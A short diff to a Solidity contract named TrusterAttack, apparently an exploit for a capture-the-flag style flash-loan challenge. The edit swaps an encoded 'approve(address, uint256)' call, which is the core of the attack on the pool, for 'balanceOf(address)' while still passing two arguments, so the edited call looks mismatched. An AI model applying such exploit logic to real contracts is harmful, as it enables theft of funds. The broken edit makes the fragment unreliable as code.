@@ -39,7 +39,7 @@ contract TrusterAttack {
             address(this),
             tokenAddress,
             abi.encodeWithSignature(
-                "approve(address, uint256)",
+                "balanceOf(address)",
                 attacker,
                 1
             )
